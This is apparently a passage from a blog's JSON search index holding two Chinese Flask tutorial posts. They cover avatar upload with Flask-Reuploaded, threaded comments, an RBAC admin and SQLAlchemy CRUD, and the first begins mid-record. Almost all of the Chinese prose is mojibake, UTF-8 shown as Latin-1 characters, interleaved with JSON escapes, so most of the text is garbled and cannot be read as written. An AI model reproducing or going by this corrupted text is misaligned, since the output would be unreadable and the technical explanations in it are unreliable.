æ˜¯ç»•ä¸å¼€çš„è¯é¢˜ã€‚åœ¨ä¸Šä¸€ç¯‡å‚è€ƒçš„æ•™ç¨‹ä¸­ï¼Œå¤´åƒçš„å®ç°æ˜¯ç”±æ‰˜ç®¡ç½‘ç«™ç”Ÿæˆéšæœºçš„å›¾ç‰‡ã€‚é—æ†¾çš„æ˜¯å¹¶æ²¡æœ‰åƒ ORM ä¸€æ ·æ–¹ä¾¿æ•°æ®åº“å¤„ç†çš„æ–‡ä»¶å¤„ç†æ¡†æ¶å¯ä¾›ä½¿ç”¨ï¼Œè¿˜æ˜¯è‡ªå·±æŠŠä»–å•ƒä¸‹æ¥å§ã€‚\næ³¨æ„è¸©å‘ï¼å¤§éƒ¨ä»½èµ„æ–™æ¨èä½¿ç”¨Flask_uploadsæ’ä»¶ï¼Œç„¶è€Œä½¿ç”¨è¯¥æ’ä»¶æ—¶å‡ºç°å¦‚ä¸‹æŠ¥é”™ï¼š\n1 ImportError: cannot import name \u0026#39;secure_filename\u0026#39; from \u0026#39;werkzeug\u0026#39; æŸ¥é˜…Stackoverflowå¾—çŸ¥æ˜¯PYPIæºä¸Šçš„Flask_uploadsæ’ä»¶ä¸å†ç»´æŠ¤äº†ï¼Œäºæ˜¯å’Œ werkzeug åº“çš„apiä¸å…¼å®¹ï¼Œæ˜¯æ’ä»¶å†…åœ¨çš„bugã€‚ç½‘ä¸Šçš„è§£å†³æ–¹æ³•æœ‰äºŒï¼š\nä¸€æ˜¯ä¿®æ”¹åº“æºç  äºŒæ˜¯æ¢å¦ä¸€ä¸ªåº“ï¼Œç»´æŠ¤è‰¯å¥½ä¸”å¯æ— ç¼è¿ç§»ï¼Œåä¸ºFlask-Reuploaded å‰è€…ä¸åˆ©äºåç»­éƒ¨ç½²ï¼Œæœ¬äººå€¾å‘äºåè€…ã€‚ç„¶è€Œï¼Œä½¿ç”¨æ–°åº“ä¹Ÿé‡åˆ°äº†è¯¸å¤šéº»çƒ¦ï¼Œä½¿ç”¨UploadSet.url()æ–¹æ³•æ—¶ï¼ŒæŠ¥é”™å¦‚ä¸‹ï¼š\n1 werkzeug.routing.BuildError: Could not build url for endpoint \u0026#39;_uploads.uploaded_file\u0026#39; with values [\u0026#39;filename\u0026#39;, \u0026#39;setname\u0026#39;]. UploadSet.url()æ–¹æ³•è¿”å›å¯¹åº”æ–‡ä»¶çš„å¯è®¿é—®urlï¼Œè¿”å›çš„urlé»˜è®¤å¸¦æœ‰_upload/å‰ç¼€ï¼Œè¿™æ˜¯ Flask-Uploads è‡ªå¸¦çš„è·¯ç”±ï¼Œä¹Ÿè¢«ç§°ä¸º autoserve ã€‚ ç„¶è€Œå®˜æ–¹æ–‡æ¡£é‡Œæœ‰è¿™æ ·ä¸€å¥è¯\nautoserve of uploaded images now has been deactivated; this was a poorly documented â€œfeatureâ€, which even could have lead to unwanted data disclosure; if you want to activate the feature again, you need to set UPLOADS_AUTOSERVE=True\nçœ‹æ¥ Flask-Reuploaded çš„ä½œè€…ä¼¼ä¹è®¤ä¸ºæ–‡ä»¶è¯»å–åŠŸèƒ½ä¸æˆ‘æ— ç“œã€‚å¥½å§ï¼Œè¿™éƒ¨åˆ†æˆ‘ä»¬è‡ªå·±å®ç°ã€‚\n// æµªè´¹äº†ä¸€æ™šä¸Šdebugï¼Œç»“æœåªæ˜¯å› ä¸ºæ–‡æ¡£æ²¡çœ‹æ˜ç™½ï¼Œå†æ¬¡è¯æ˜è¯»æ–‡æ¡£çš„é‡è¦æ€§ã€‚\nFlask-Reuploaded: æ–‡ä»¶ä¸Šä¼  æ’ä»¶å°†ä¸Šä¼ çš„ä¸€ç±»æ–‡ä»¶æŠ½è±¡æˆé›†åˆUploadSetã€‚å¯¹æ¯ä¸ª Set æœ‰å¦‚ä¸‹æ“ä½œï¼š\né…ç½®æ–‡ä»¶ç±»å‹ï¼šphotos = UploadSet('photos', IMAGES) //ç±»å‹åŒ…æ‹¬ï¼šIMAGESã€TEXTã€AUDIOâ€¦â€¦ é…ç½®å­˜è´®è·¯å¾„ï¼šapp.config['UPLOADED_PHOTOS_DEST'] // Photos ä¸º Set çš„å˜é‡å ä¿å­˜æ–‡ä»¶ï¼šfilename = photos.save(request.files['photo']) è¿”å›é“¾æ¥ï¼šphotos.url(filename) æœ€åï¼Œæ³¨å†Œ Set å’Œæ’ä»¶æ³¨å†Œç±»ä¼¼ï¼šconfigure_uploads(app, [avatars, photos]) //å¯ä¸€æ¬¡æ€§å…¨éƒ¨æ³¨å†Œ\nå®ç°å¤´åƒä¸Šä¼ çš„æ­¥éª¤å¦‚ä¸‹ï¼š\næ¨¡å‹å±‚ï¼š User æ·»åŠ  avatar å­—æ®µï¼Œå‚¨å­˜å¤´åƒçš„æ–‡ä»¶åã€‚åŸavatar()æ–¹æ³•ä½œä¸ºé»˜è®¤å¤´åƒã€‚ è¡¨å•å±‚ï¼š edit_profile è¡¨å•å¢åŠ FileFieldå­—æ®µ è§†å›¾å±‚ï¼š å‚¨å­˜æ–‡ä»¶ï¼Œå‘æ•°æ®åº“æäº¤æ–‡ä»¶åã€‚ æ¨¡æ¿å±‚ï¼š æ”¹ç”¨ç¡¬è·¯ç”±è·å–urlã€‚// æœ€ç»ˆ .url() è¿˜æ˜¯æœ‰bugï¼Œå†æ¬¡è¯´æ˜ä¸è¦ä¹±ç”¨ä¸çŸ¥åçš„æ’ä»¶ å›¾åº“æ¨¡å— æœ¬æ¨¡å—åŒ…æ‹¬å¦‚ä¸‹è·¯ç”±ï¼š\n/indexï¼šä¸»é¡µæ˜¾ç¤ºç€‘å¸ƒæµ /uploadï¼šä¸Šä¼ æ¥å£ï¼šå‚è€ƒå¤´åƒä¸Šä¼  /detailï¼šè¯¦æƒ…ï¼Œæ˜¾ç¤ºè¯„è®º /deleteï¼šåˆ é™¤æ¥å£ï¼šåŒæ—¶åˆ é™¤æ–‡ä»¶ ç”±äºæœ¬é¡¹ç›®å‰ç«¯æ¡†æ¶æ˜¯ Bootstrap ï¼ŒğŸ‘´ä¸æƒ³å†™Jqueryï¼Œæ‰€ä»¥ç›´æ¥åˆ·æ–°é¡µé¢ï¼Œä¹Ÿä¸å¼„æ— é™æ»šåŠ¨äº†ï¼ŒæŒ‰é’®äº†äº‹ã€‚å¦å¤–ä¸ºäº†ä¸åŒåˆ—é•¿åº¦å°½é‡å‡åŒ€ï¼Œæ•…é‡‡ç”¨å–å·§çš„æ–¹æ³•ï¼Œå¹³å‡åˆ†é…ã€‚æ ¹æ®å¤§æ•°å®šç†ï¼Œåªè¦éšæœºå›¾ç‰‡è¶³å¤Ÿå¤šè‚¯å®šä¼šå·®ä¸å¤šå‡åŒ€ã€‚ã€‚ã€‚ã€‚\n0x02 è¯„è®ºç³»ç»Ÿ æ•°æ®åº“è®¾è®¡ è¯„è®ºåŒ…å«äº†ä¸¤ä¸ªä¸€å¯¹å¤šå…³ç³»ï¼Œæ—¢æ˜¯è¯„è®ºå’Œæ–‡ç« çš„ä¸€å¯¹å¤šå…³ç³»ï¼Œä¹Ÿæ˜¯è¯„è®ºå’Œç”¨æˆ·çš„ä¸€å¯¹å¤šã€‚ä¸ºæ­¤ï¼Œåªéœ€è¦ç»™Userå’ŒPostæ·»åŠ å…³ç³»å³å¯ã€‚ ç„¶è€Œï¼Œæˆ‘ä»¬å¸Œæœ›è®¾è®¡ç»Ÿä¸€çš„Commentæ¨¡å‹ï¼Œè¯„è®ºçš„å¯¹è±¡æ—¢å¯ä»¥æ˜¯æ–‡ç« ï¼Œä¹Ÿå¯ä»¥æ˜¯å›¾ç‰‡ï¼Œä¹Ÿå¯ä»¥æ˜¯å…¶ä»–è¯„è®ºã€‚ä¸ºæ­¤ï¼Œæ·»åŠ ä¸€ä¸ªæšä¸¾ç±»å‹çš„å­—æ®µæŒ‡ç¤ºè¯„è®ºç±»å‹ï¼Œä»è€Œé‡‡ç”¨ä¸åŒçš„å¤„ç†é€»è¾‘ã€‚\næ¥¼ä¸­æ¥¼ è€Œä¸»æµç½‘ç«™ä¸å…‰æ”¯æŒå¯¹æ–‡ç« è¯„è®ºï¼Œè¿˜æ”¯æŒæ¥¼ä¸­æ¥¼ã€‚å¯¹æ¥¼ä¸­æ¥¼çš„å®ç°æœ‰ä»¥ä¸‹å‡ ç§æ–¹æ¡ˆï¼š\næŒ‰æ—¶é—´å¹³é“ºï¼šä»¥åŸç™¾åº¦è´´å§ä¸ºä¾‹ æ·»åŠ  reply_id å­—æ®µï¼ŒæŒ‡ç¤ºè¦å›å¤çš„äºº å¥—å¨ƒå¼ç¼©è¿›ï¼šä»¥æŸäº›è€å¼bbsä¸ºä¾‹ æ·»åŠ  parent_id å­—æ®µï¼ŒæŒ‡ç¤ºçˆ¶è¯„è®ºï¼ˆé¡¶å±‚è¯„è®ºåˆ™ä¸ºæœ¬èº«idï¼‰ï¼Œåœ¨å®ä½“ç±»ä¸­ä¿å­˜å­è¯„è®ºåˆ—è¡¨ å¼¹çª—å¼æŸ¥çœ‹ï¼šä»¥çŸ¥ä¹ï¼Œbç«™ä¸ºä¾‹ åœ¨æŒ‰æ—¶é—´å¹³é“ºçš„åŸºç¡€ä¸Šï¼Œè‹¥ reply_idå­˜åœ¨æ·»åŠ â€œæŸ¥çœ‹å¯¹è¯â€æŒ‰é’®ï¼Œé€’å½’çš„æ„å»ºå¯¹è¯å¹¶å¼¹çª—ã€‚ å…¶ä¸­ï¼Œç¬¬ä¸€ç§å®ç°ç®€å•ï¼Œç”¨æˆ·ä¸å‹å¥½ï¼›ç¬¬äºŒç§å®ç°å¤æ‚ï¼Œå¯¹å¤šå±‚çº§å¯¹è¯æ— æ³•èƒœä»»ï¼›ç¬¬ä¸‰ç§æ˜¯æœ€ä¸»æµçš„å®ç°æ–¹å¼ã€‚\né€šè¿‡ä»¥reply_idä½œä¸ºæŒ‡é’ˆï¼Œæ‰€æœ‰è¯„è®ºè¿æ¥æˆäº†ä¸€æ£µæ ‘ï¼Œåœ¨ä»»æ„ä¸€ä¸ªèŠ‚ç‚¹è¿›è¡Œâ€œæŸ¥çœ‹å¯¹è¯â€æ“ä½œï¼Œå°±æ˜¯æ‰§è¡Œæ ‘çš„å¯»æ ¹ã€‚â€œæŸ¥çœ‹å¯¹è¯â€å‡½æ•°å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 @staticmethod def view_dialogue(c_id): dialogue = [c_id] while Comment.query.get(c_id).type == \u0026#39;comment\u0026#39;: c_id = Comment.query.get(c_id).reply_id if Comment.query.get(c_id) is None: break dialogue.append(c_id) return dialogue 0x03 ç½‘ç«™åå° ç½‘ç«™çš„åå°é€šå¸¸ç»™ç®¡ç†å‘˜æä¾›ç»Ÿä¸€ç›‘ç®¡æ•°æ®åº“çš„ç•Œé¢ã€‚æœ‰ä»¥ä¸‹æ’ä»¶å¸®åŠ©å®ç°ï¼š\nFlask-adminï¼šä¸€é”®ç”Ÿæˆåå°é¡µé¢ï¼Œå¹¶å¯ä»¥è‡ªå®šä¹‰è§†å›¾å’Œæ¨¡å‹ã€‚ Flask-Securityï¼š æ¯”adminå±‚æ¬¡æ›´é«˜ï¼Œå°è£…äº†å¸¸ç”¨è§†å›¾å’Œæ¨¡æ¿ã€‚ä½†æ˜¯æ–‡æ¡£å°‘ï¼Œä¸”å¾ˆå¤šåŠŸèƒ½æˆ‘ä»¬å·²ç»å®ç°äº†ï¼Œå†ä½¿ç”¨å®ƒå°±è¦æ¨ç¿»é‡åšã€‚é‚å¼ƒç”¨ã€‚ æœ¬æ•™ç¨‹ä¸­ä½¿ç”¨äº† RBACï¼ˆRole-Based Access Control) åŸºäºè§’è‰²çš„è®¿é—®æ§åˆ¶ï¼Œç®€å•è¯´å°±æ˜¯è®¾è®¡ä¸€ä¸ªè§’è‰²è¡¨ï¼Œç”¨æˆ·è¡¨å’Œè§’è‰²è¡¨ç”¨å…³è”è¡¨å®ç°å¤šå¯¹å¤šå…³è”ã€‚è¿™æ ·åšçš„å¥½å¤„æ˜¯ï¼Œé’ˆå¯¹è§’è‰²çš„æƒé™åˆ†é…ï¼Œä¿®æ”¹æƒé™æ—¶æ— éœ€ä¿®æ”¹æ¯ä¸ªç”¨æˆ·ã€‚\n0x04 çƒ­æœ æœ¬èŠ‚å†åŠ å…¥ä¸€ä¸ªé‡é‡çº§å†…å®¹ï¼Œåˆ©ç”¨ redis å®ç°æµè§ˆé‡æ’è¡Œæ¦œï¼Œä¹Ÿå°±æ˜¯çƒ­æœã€‚å½“ç„¶ï¼ŒçœŸæ­£çš„çƒ­æœæ¦œå•æ’åè§„åˆ™æ›´åŠ å¤æ‚ï¼Œè¿™é‡Œåªé€šè¿‡ç®€å•çš„æµè§ˆé‡è®¡æ•°æ¥ç»ƒä¹  redis çš„ä½¿ç”¨ã€‚\nã€ğŸ‘´æœ‰æ—¶é—´å†åšã€‘\nä¸è¦è®©å¼€å‘åœä¸‹æ¥ å¯ä»¥åŠ çš„åŠŸèƒ½è¿˜æœ‰å¾ˆå¤šï¼šæ—¶é—´çº¿ï¼Œemojiæ”¯æŒï¼Œå¤šåª’ä½“ï¼Œå‰åç«¯åˆ†ç¦»(Vue)ï¼Œï¼Œ\né™¤äº†åŠŸèƒ½ï¼Œå½“é¢å¯¹æ›´é«˜é‡çº§çš„æµé‡æ—¶ï¼Œç½‘ç«™æ€§èƒ½ä¾¿æ›´åŠ é‡è¦ï¼Œè¿™æ—¶å€™æ¶ˆæ¯é˜Ÿåˆ—ï¼ŒPRCï¼Œå¾®æœåŠ¡/åˆ†å¸ƒå¼ï¼Œï¼Œï¼Œæ›´è®©äººå¤´ç§ƒã€‚\nWebå¼€å‘ä¹‹è·¯ï¼Œé“é˜»ä¸”é•¿ã€‚ä½†æ˜¯ï¼Œåªè¦å¼€å‘ä¸åœä¸‹æ¥ï¼Œé“è·¯å°±ä¼šä¸æ–­å»¶ç”³ã€‚ã€‚ã€‚ï¼ˆå¸Œæœ›ä¹‹èŠ±.mp3ï¼‰\n","date":"2021-09-16T12:43:23Z","permalink":"https://lonelyuan.github.io/p/%E5%B9%B4%E8%BD%BB%E4%BA%BA%E7%9A%84%E7%AC%AC%E4%BA%8C%E4%B8%AA%E7%BD%91%E7%AB%99%E4%BA%8C-flask-supreme-tutorial/","title":"å¹´è½»äººçš„ç¬¬äºŒä¸ªç½‘ç«™ï¼ˆäºŒï¼‰ - flask-supreme-tutorial"},{"content":" æœ¬æ–‡ä¸º Flask æ¡†æ¶å­¦ä¹ ç¬”è®°ï¼Œä¸»è¦å‚è€ƒäº† The-Flask-Mega-Tutorial å’Œ ã€ŠFlask Webå¼€å‘ï¼šåŸºäºPythonçš„Webåº”ç”¨å¼€å‘å®æˆ˜ã€‹ä¸¤æœ¬ä¹¦ï¼Œå¹¶åœ¨åŸé¡¹ç›®çš„åŸºç¡€ä¸Šæ‹“å±•ã€‚ï¼ˆä¸‹æ–‡ç»Ÿç§°è¿™ä¸¤ä¸ªèµ„æºä¸ºâ€œæœ¬æ•™ç¨‹â€ï¼‰ ä¸ç†Ÿæ‚‰ Flask æ¡†æ¶è¯·å…ˆé˜…è¯»å¿«é€Ÿä¸Šæ‰‹ - flask ä¸­æ–‡æ–‡æ¡£ ã€‚\nè¿™ä¸¤æœ¬ä¹¦çš„ä½œè€…æ˜¯åŒä¸€ä¸ªäººï¼Œå°±å†…å®¹ä¸Šè¯´åè€…ç®—æ˜¯å‰è€…çš„è±ªåç‰ˆã€‚æœ¬æ•™ç¨‹çš„ä¼˜ç‚¹æ˜¯å†…å®¹å…¨é¢ï¼Œä»å…¥é—¨åˆ°éƒ¨ç½²ä¸€ç«™å¼æœåŠ¡ï¼›ç¼ºç‚¹æ˜¯ä¸å¤Ÿæ·±å…¥ï¼Œä¸”æœ‰äº›è¿‡æ—¶ï¼Œä¹¦ä¸­ä¸¾ä¾‹çš„è¯¸å¤šæ’ä»¶å‡ä¸ºä½œè€…ä¸ºäº†æ­¤ä¹¦è€Œå¼€å‘çš„ï¼Œå·²ç»è®¸ä¹…ä¸å†ç»´æŠ¤ï¼Œå¯¼è‡´å¾ˆéš¾åœ¨å…¶ç¤ºä¾‹é¡¹ç›®ä¸Šæ‹“å±•ã€‚ä¸€çœ‹æ‰‰é¡µï¼Œ2015å¹´å‡ºç‰ˆï¼Œé‚£æ²¡äº‹äº†ã€‚ è‡³äºç¬¬ä¸€ä¸ªç½‘ç«™ï¼Ÿå‚è§#TODO:å¹´è½»äººçš„ç¬¬ä¸€ä¸ªç½‘ç«™\n0x00 å¤§å‹é¡¹ç›®ç»“æ„ åœ¨å¤§éƒ¨åˆ†é¢å‘åˆå­¦è€…çš„ demo ä¸­ï¼Œåº”ç”¨ä»¥ç®€å•çš„é¡¹ç›®ç»“æ„ç”šè‡³å•æ–‡ä»¶è¡¨ç¤ºã€‚åœ¨å¤§å‹é¡¹ç›®ä¸­ï¼Œç½‘ç«™çš„ä¸åŒåŠŸèƒ½è¢«æ‹†åˆ†æˆç‹¬ç«‹çš„æ¨¡å—ï¼Œä»¥æ–¹ä¾¿æ‹“å±•å’Œç»´æŠ¤ã€‚ä¸€ä¸ªæ›´é€šç”¨çš„ Flask é¡¹ç›®ä»£ç æ¶æ„å¦‚ä¸‹ï¼šï¼ˆä»…è€ƒè™‘ä¸šåŠ¡ä»£ç ï¼‰\n1 2 3 4 5 6 7 8 9 10 microblog/ # æ ¹ç›®å½• app/ # é¡¹ç›®æºç  __init__.py # é¡¹ç›®åˆå§‹åŒ–ï¼Œå½“è¯¥åŒ…è¢«importï¼Œé¦–å…ˆæ‰§è¡Œ__init__.py routes.py forms.py ... main.py # æ¡†æ¶å…¥å£ config.py # Configé…ç½®ç±» .flaskenv ... æ ¹ç›®å½•ä¸‹çš„æ–‡ä»¶æœ‰ï¼š\napp/æ‰€æœ‰ç½‘ç«™æºä»£ç ç»Ÿä¸€å½’åˆ°appç›®å½•ä¸‹ã€‚ åœ¨app/å†…éƒ¨ï¼Œä¸åŒçš„åŠŸèƒ½å¯è¿›ä¸€æ­¥åˆ’åˆ†æˆç‹¬ç«‹æ¨¡å—ï¼Œè¯¦è§[æ¨¡å—åŒ–åº”ç”¨](#0x05 æ¨¡å—åŒ–åº”ç”¨ï¼šåŠŸèƒ½è§£è€¦)ä¸€ç« ã€‚ main.py: å…¥å£è„šæœ¬ï¼Œé€šè¿‡è¯¥æ–‡ä»¶å¼•å…¥appä¸­çš„ä»£ç å¹¶ç”Ÿæˆåº”ç”¨å®ä¾‹ï¼ˆå‘½åéšæ„ï¼‰ .flaskenv: flaskç¯å¢ƒå˜é‡ï¼Œä»¥é…åˆflaskå‘½ä»¤ã€‚å…¥å£è„šæœ¬è¢«å®šä¹‰ä¸ºFLASK_APPï¼Œæ‰§è¡Œflask runæ—¶å°†å¯åŠ¨è¯¥è„šæœ¬ã€‚ config.py: é…ç½®è„šæœ¬ï¼Œæ•´ä¸ªé¡¹ç›®çš„é…ç½®ä¿¡æ¯éƒ½å†™åœ¨Configç±»é‡Œã€‚ä¸ç¯å¢ƒå˜é‡çš„åŒºåˆ«åœ¨äºï¼Œå› ä¸ºæ˜¯pythonè„šæœ¬ï¼ŒåŠŸèƒ½æ›´å¼ºå¤§ï¼Œå¯è¢«ä»»ä½•åœ°æ–¹çš„ä»£ç å¼•ç”¨ã€‚ 0x01 Hello worldï¼šæ¨¡æ¿å’Œè§†å›¾ æœ€åŸºæœ¬çš„ web åŠŸèƒ½ï¼Œæ— éæ¥å—è¯·æ±‚ã€è¿”å›æ•°æ®ã€‚å…¶ä¸­ï¼Œè·¯ç”± (route) ç”¨æ¥åŒºåˆ†ä¸åŒçš„è¯·æ±‚ï¼Œæ¨¡æ¿ (templates) ç”¨æ¥ç”Ÿæˆä¸åŒçš„æ•°æ®ã€‚\nè·¯ç”±/è§†å›¾ åœ¨éå‰åç«¯åˆ†ç¦»çš„é¡¹ç›®ä¸­ï¼Œè§†å›¾å‡½æ•°ç›´æ¥è¿”å›æ¸²æŸ“å¥½çš„ç½‘é¡µï¼Œç”±@app.route()ä¿®é¥°åï¼Œè§†å›¾å’Œè·¯ç”±ä¾¿ç»‘å®šåœ¨ä¸€èµ·ã€‚ åœ¨mvcæ¨¡å‹ä¸­æ›´åƒcontrolleræ§åˆ¶å™¨çš„è§’è‰²ï¼Œç„¶è€Œåœ¨flaskç”Ÿæ€ä¸­æ›´å–œæ¬¢ç§°ä¸ºè§†å›¾å‡½æ•°ã€‚\nurl_for() ä½¿ç”¨URLåˆ°è§†å›¾å‡½æ•°çš„å†…éƒ¨æ˜ å°„å…³ç³»æ¥ç”ŸæˆURLï¼Œç”¨æ¥æ›¿æ¢ç¡¬é“¾æ¥ã€‚åœ¨ä¸šåŠ¡åŠŸèƒ½è§£è€¦åå¿…é¡»ä½¿ç”¨è¿™ç§æ–¹å¼ã€‚ NOTEï¼šå½“è·¯ç”±å’Œè§†å›¾å‡½æ•°åä¸ä¸€è‡´ï¼Œè®¿é—®è¯¥è·¯ç”±å¯ä»¥æ­£ç¡®å“åº”ï¼Œä½†æ˜¯ä½¿ç”¨url_for()è°ƒç”¨è¯¥è§†å›¾æ—¶ä¼šæŠ¥é”™ {% extends \u0026quot;base.html\u0026quot; %} and {% include \u0026quot;_post.html\u0026quot; %} ä½¿ç”¨å­æ¨¡æ¿æ¥å®ç°ç½‘é¡µå…¬ç”¨çš„éƒ¨åˆ†ã€‚å¦‚ï¼šé¡µçœ‰ï¼Œé¡µè„šï¼Œåˆ—è¡¨é¡¹ç­‰ã€‚ æ¨¡æ¿å’Œ Python ä»£ç çš„å…³ç³»æœ‰äº›ç±»ä¼¼ä¸ JSP å’Œ Java ä»£ç çš„å…³ç³»ï¼Œä½†æ¨¡æ¿è¯­æ³•å¹¶ä¸æ˜¯å®Œæ•´çš„è„šæœ¬è¯­è¨€ï¼Œç›¸è¾ƒè€Œè¨€é™åˆ¶æ›´å¤šï¼Œå®‰å…¨æ€§æ›´å¥½ã€‚ è¡¨å• å‡ ä¹æ‰€æœ‰æˆåŠŸçš„æ¡†æ¶éƒ½æœ‰ä¸°å¯Œçš„æ’ä»¶ç”Ÿæ€ã€‚ä¸‹é¢å¼•å…¥æ–°åŠŸèƒ½æ—¶ï¼Œå¤§å¤šå€ŸåŠ©æ’ä»¶æ¥æ–¹ä¾¿çš„å®ç°ã€‚å¤§å¤šæ•°Flaskæ’ä»¶ä½¿ç”¨flask_\u0026lt;name\u0026gt; å‘½åçº¦å®šã€‚\nFlask-WTFæ’ä»¶æä¾›äº†å¯¹Webè¡¨å•çš„æŠ½è±¡ï¼Œåªéœ€å®šä¹‰è¡¨å•ç±»ä»¥åŠè®¾ç½®ç±»å±æ€§å³å¯ã€‚\næ¨¡æ¿è¯­æ³•ï¼š\n{{ form.\u0026lt;name\u0026gt;.label }}æ¸²æŸ“æ ‡ç­¾ {{ form.\u0026lt;name\u0026gt;() }}è·å–å±æ€§å€¼ form.hidden_tag()æ¨¡æ¿å‚æ•°ç”Ÿæˆäº†ä¸€ä¸ªéšè—å­—æ®µï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªç”¨äºä¿æŠ¤è¡¨å•å…å—CSRFæ”»å‡»çš„token å°†è¡¨å•å¼•å…¥æ¨¡æ¿\n1 2 form = LoginForm() # ç”Ÿæˆäº†ä¸€ä¸ªå®ä¾‹ä¼ å…¥æ¨¡æ¿ return render_template(\u0026#39;login.html\u0026#39;, title=\u0026#39;Sign In\u0026#39;, form=form) flash é—ªç°æ¶ˆæ¯ flash é€šè¿‡ session å‚¨å­˜ï¼Œç”¨äºæ˜¾ç¤ºåªå‡ºç°ä¸€æ¬¡çš„æç¤ºæ¶ˆæ¯ã€‚ç”¨æ³•ï¼š\nåœ¨è·¯ç”±ä¸­ä½¿ç”¨flash()ï¼Œè§¦å‘æ—¶æ¶ˆæ¯ä¾¿å†™å…¥ session ä¸­çš„ message åˆ—è¡¨ åœ¨æ¨¡æ¿ä¸­ä½¿ç”¨get_flashed_messages()ï¼Œä» session ä¸­è¯»å– 0x02 æ•°æ®åº“ ORM å¾ˆä¹…å¾ˆä¹…ä»¥å‰ï¼Œwebç½‘ç«™å’Œæ•°æ®åº“äº¤äº’è¿˜éœ€è¦å†™å¾ˆå¤šå¾ˆç¡¬çš„ SQL è¯­å¥ï¼Œæ•ˆç‡ä½ä¸”å®¹æ˜“å‡ºç°æ³¨å…¥æ¼æ´(SQLi)ã€‚ç°ä»£webå¼€å‘éƒ½ä½¿ç”¨ ORM æ¡†æ¶ç®€åŒ–æ•°æ®åº“äº¤äº’ï¼Œä¸”åŸºæœ¬æœç»äº† SQLi æ¼æ´ã€‚\næœ¬é¡¹ç›®ä½¿ç”¨å¦‚ä¸‹æ’ä»¶æ‰“é€šæ•°æ®åº“ï¼š\nFlask-SQLAlchemy: Pythonç”Ÿæ€æœ€çŸ¥åçš„ORMæ¡†æ¶ Flask-Migrate: æœ¬æ•™ç¨‹ä½œè€…ç¼–å†™çš„æ•°æ®åº“è¿ç§»æ¡†æ¶ æ’ä»¶é¦–å…ˆè¦æ³¨å†Œã€‚ç»Ÿä¸€æµç¨‹: åˆå§‹åŒ–appå®ä¾‹ï¼Œä¼ å…¥æ’ä»¶ç±»ä½œä¸ºæ’ä»¶å®ä¾‹çš„å‚æ•°\n1 2 3 4 5 # app/__init__.py app = Flask(__name__) # flaskåŸºç±» app.config.from_object(Config) db = SQLAlchemy(app) migrate = Migrate(app, db) SQLalchemyï¼šmodelå±‚ æ¨¡å‹å®šä¹‰ ä½¿ç”¨ç±»å’Œç±»å±æ€§ä»£è¡¨ table å’Œ colunm ï¼Œä¾¿å¯è½»æ¾ç¼–å†™æ•°æ®æ¨¡å‹ã€‚SQLalchemy çš„æ¦‚å¿µæŠ½è±¡å¦‚ä¸‹å›¾ï¼š Flask-SQLAlchemy è‡ªåŠ¨è®¾ç½®ç±»åä¸ºå°å†™æ¥ä½œä¸ºå¯¹åº”è¡¨çš„åç§°ï¼Œä¹Ÿå¯ä»¥ç”¨__tablename__ç±»å±æ€§æ¥å®šä¹‰ã€‚\n1 2 3 class Post(db.Model): # è¡¨ id = db.Column(db.Integer, primary_key=True) # åˆ— .... CURDåŸºæœ¬æ“ä½œ ORM æ¡†æ¶é€šå¸¸é›†æˆäº†å¸¸ç”¨æ“ä½œï¼Œä½†ä¹Ÿæ”¯æŒæ›´åº•å±‚çš„æ•°æ®åº“æ¥å£ã€‚\nåœ¨ Springboot Jpa ä¸­ï¼Œæ ¹æ®æ–¹æ³•åçš„æ‹¼å†™æ¥å†™è‡ªå®šä¹‰æŸ¥è¯¢ï¼Œè€Œåœ¨ SQLalchemy ä¸­ï¼Œæä¾›çš„æ¥å£é€šè¿‡é“¾å¼è°ƒç”¨æ‹¼æ¥ã€‚\nåœ¨ SQLalchemy ä¸­ï¼ŒåŸºæœ¬æ“ä½œå¤§éƒ½æœ‰åŸºäºäº‹åŠ¡ (session) çš„å’ŒåŸºäºæŸ¥è¯¢ (query) çš„ä¸¤ç§æ–¹å¼ã€‚\næŸ¥\n1 session.query(User) queryæ–¹æ³•åªæœ‰æ„é€ ä¸€ä¸ªæŸ¥è¯¢ï¼Œåªæœ‰åœ¨Query.get()ã€Query.all()ã€Query.one()ç­‰ç»“æŸç¬¦ä¹‹åæ‰ä¼šæ‰§è¡ŒæŸ¥è¯¢\nå¢ï¼š\n1 2 db.session.add(user) db.session.commit() åˆ \n1 2 3 4 session.query(User).delete() # or session.delete(session.query(User).get(1)) session.commit() æ”¹\n1 2 3 4 5 6 7 8 9 query = (session .query(User) .filter_by(id=1) .update({\u0026#34;username\u0026#34;: User.username + \u0026#34;a\u0026#34;}, synchronize_session=False) ) # or user = (session.query(User).get(1)) user.password = \u0026#34;zxcv\u0026#34; session.commit() Flask-Migrate: æ•°æ®åº“è¿ç§» é…ç½®æ•°æ®åº“çš„åˆå§‹æ•°æ®æ¡†æ¶ï¼Œä¸€èˆ¬å†™æˆSQLè„šæœ¬å½¢å¼ã€‚ migrate æ¡†æ¶ç›´æ¥æ ¹æ® model å±‚ç”Ÿæˆè¿ç§»è„šæœ¬ï¼Œå¯ä»¥æ–¹ä¾¿çš„è·Ÿè¸ªæ•°æ®æ¨¡å‹çš„ä¿®æ”¹å’Œæ•°æ®åº“çš„åˆ‡æ¢ã€‚ï¼ˆè¿™ä¸ªæ¡†æ¶è¿˜æ˜¯æœ¬æ•™ç¨‹ä½œè€…è‡ªå·±å¼€å‘çš„ï¼Œå¼ºï¼‰\nflask dbå­å‘½ä»¤\nflask db initï¼šåˆå§‹åŒ–ï¼Œç”Ÿæˆmigrationsç›®å½• flask db migrateï¼šç”Ÿæˆè¿ç§»è„šæœ¬ï¼Œä¿®æ”¹modelåä½¿å…¶ç”Ÿæ•ˆ flask db migrate -m \u0026quot;posts table\u0026quot; flask db upgradeï¼šåº”ç”¨æ•°æ®åº“ä¿®æ”¹ï¼ˆå¼€å‘é˜¶æ®µé»˜è®¤ä½¿ç”¨sqliteæ•°æ®åº“ flask db downgradeï¼šå›æ»šä¸Šæ¬¡çš„è¿ç§» 0x03 å¼€å‘èŒƒå¼ï¼šç”¨æˆ·ç³»ç»Ÿ mixinï¼šæ··å…¥ï¼Œå¤šé‡ç»§æ‰¿çš„ä¸€ç§å½¢å¼\nè¡¨å•å’Œæ•°æ®åº“æ”¯æŒåˆ†åˆ«è§£å†³äº†å‰ç«¯å’Œåç«¯çš„åŸºæœ¬éœ€æ±‚ï¼Œä¸‹é¢å¯ä»¥ä¸Šçº¿ä¸€ä¸ªåŸºæœ¬åŠŸèƒ½äº†ï¼Œç”¨æˆ·ç™»å½•ã€‚ æ‰€éœ€æ’ä»¶ï¼šFlask-Loginã€‚\nUserMixinç±» 